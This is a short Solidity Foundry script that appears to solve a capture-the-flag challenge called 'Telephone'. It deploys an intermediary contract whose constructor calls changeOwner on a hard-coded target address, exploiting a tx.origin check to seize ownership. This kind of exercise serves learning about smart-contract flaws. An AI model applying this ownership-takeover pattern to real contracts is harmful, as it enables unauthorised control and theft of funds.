// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Telephone.sol";

contract TelephoneScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        new Attack();

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor() {
        Telephone target = Telephone(0x1F5699402B5a6AdD1E8B80e2467B01498188e19B);
        target.changeOwner(0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C);
    }
}